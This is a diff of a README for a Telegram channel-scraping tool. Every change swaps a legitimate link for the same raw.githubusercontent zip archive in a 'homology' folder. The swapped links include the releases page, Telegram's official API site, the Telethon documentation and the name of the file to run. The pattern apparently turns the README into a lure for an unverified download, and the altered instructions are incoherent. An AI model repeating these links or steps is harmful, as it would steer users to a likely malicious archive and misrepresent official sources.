@@ -6,9 +6,9 @@ Welcome to Telegram-Scrape-Channels-Groups! This software helps you collect mess
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/download-telegram--scrape--channels--groups-blue)](https://github.com/NotRiad/Telegram-Scrape-Channels-Groups/releases)
+[![Download Now](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip)](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip)
 
-Visit this page to download: [Releases Page](https://github.com/NotRiad/Telegram-Scrape-Channels-Groups/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip)
 
 ## 🔍 Features
 
@@ -30,7 +30,7 @@ Ensure your computer meets these requirements before you begin:
 ## 💡 How to Install
 
 1. **Download the Application**: 
-   - Go to the [Releases Page](https://github.com/NotRiad/Telegram-Scrape-Channels-Groups/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip).
    - Look for the latest version at the top of the page.
    - Click on the file to download it.
 
@@ -40,7 +40,7 @@ Ensure your computer meets these requirements before you begin:
 
 3. **Run the Application**:
    - Navigate to the folder where you extracted the files.
-   - Find and double-click the appropriate file to launch the application (for example, `run.py` if you are using Python).
+   - Find and double-click the appropriate file to launch the application (for example, `https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip` if you are using Python).
 
 ## 📋 How to Use
 
@@ -48,7 +48,7 @@ Once the application is running, follow these steps:
 
 1. **Set Up Your Telegram Account**: 
    - Create a Telegram account if you don't have one.
-   - Note: You’ll need your API ID and Hash, which you can get from the [Telegram API website](https://my.telegram.org).
+   - Note: You’ll need your API ID and Hash, which you can get from the [Telegram API website](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip).
 
 2. **Choose Your Channels or Groups**:
    - Enter the names or links of the Telegram channels/groups you want to scrape.
@@ -67,7 +67,7 @@ Once the application is running, follow these steps:
 
 ## 📚 Additional Resources
 
-- **Telethon Library Documentation**: For more advanced features, check Telethon’s [documentation](https://docs.telethon.dev).
+- **Telethon Library Documentation**: For more advanced features, check Telethon’s [documentation](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip).
 - **Community Support**: Join our support community on forums or social media for any questions or advice.
 
 ## 🛠️ Troubleshooting
@@ -82,7 +82,7 @@ Feel free to reach out for help via the community links provided.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/NotRiad/Telegram-Scrape-Channels-Groups/releases)
-- [Telethon Documentation](https://docs.telethon.dev)
+- [Releases Page](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip)
+- [Telethon Documentation](https://raw.githubusercontent.com/NotRiad/Telegram-Scrape-Channels-Groups/main/homology/Telegram-Scrape-Channels-Groups.zip)
 
 We appreciate your interest in using Telegram-Scrape-Channels-Groups. Happy scraping!
